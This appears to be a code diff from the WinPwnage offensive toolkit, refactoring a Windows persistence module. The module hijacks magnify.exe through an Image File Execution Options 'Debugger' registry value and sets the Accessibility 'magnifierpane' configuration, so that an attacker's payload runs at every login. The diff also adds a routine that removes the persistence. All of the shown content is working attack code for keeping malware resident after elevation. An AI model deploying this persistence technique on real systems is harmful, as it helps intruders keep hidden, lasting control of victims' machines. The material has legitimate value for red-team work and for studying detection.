@@ -1,5 +1,3 @@
-import os
-import _winreg
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 
@@ -15,56 +13,35 @@ ifeo_info = {
 }
 
 
-def create_magnifierpane_key(path):
-	try:
-		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, os.path.join(path))
-		_winreg.SetValueEx(key, "Configuration", 0, _winreg.REG_SZ, "magnifierpane")
-		_winreg.CloseKey(key)
-	except Exception as error:
+def ifeo(payload, name='', add=True):
+	if not information().admin():
+		print_error("Cannot proceed, we are not elevated")
 		return False
+
+	if "64" in information().architecture():
+		magnify_key = "Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"
 	else:
-		return True
+		magnify_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe"
 
+	accessibility_key = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility"
 
-def create_debugger_key(path,payload):
-	try:
-		key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join(path))
-		_winreg.SetValueEx(key, "Debugger", 0, _winreg.REG_SZ,payload)
-		_winreg.CloseKey(key)
-	except Exception as error:
-		return False
-	else:
-		return True
-
-
-def ifeo(payload):
-	if payloads().exe(payload):
-		if information().admin():
-			if "64" in information().architecture():
-				if create_debugger_key("Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe", payload):
-					print_success("Successfully created Debugger key containing payload ({})".format(os.path.join(payload)))
-					if create_magnifierpane_key("Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility"):
-						print_success("Successfully installed persistence, payload will run at login")
-					else:
-						print_error("Unable to install persistence")
-						return False
-				else:
-					print_error("Unable to install persistence")
-					return False
-			else:
-				if create_debugger_key("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe", payload):
-					print_success("Successfully created Debugger key containing payload ({})".format(os.path.join(payload)))
-					if create_magnifierpane_key("Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility"):
-						print_success("Successfully installed persistence, payload will run at login")
-					else:
-						print_error("Unable to install persistence")
-						return False
-				else:
-					print_error("Unable to install persistence")
-					return False
+	if add:
+		if payloads().exe(payload):
+			if registry().modify_key(hkey="hklm", path=magnify_key, name="Debugger", value=payload, create=True):
+				print_success("Successfully created Debugger key containing payload ({})".format(payload))
+				if registry().modify_key(hkey="hklm", path=accessibility_key, name="Configuration", value="magnifierpane", create=True):
+					print_success("Successfully installed persistence, payload will run at login")
+					return True
+			print_error("Unable to install persistence")
+			return False
 		else:
-			print_error("Cannot proceed, we are not elevated")
+			print_error("Cannot proceed, invalid payload")
 			return False
 	else:
-		print_error("Cannot proceed, invalid payload")
+		if registry().remove_key(hkey="hklm", path=accessibility_key, name="Configuration"):
+			if registry().remove_key(hkey="hklm", path=magnify_key, delete_key=True):
+				print_success("Successfully removed persistence")
+				return True
+
+		print_error("Unable to remove persistence")
 		return False
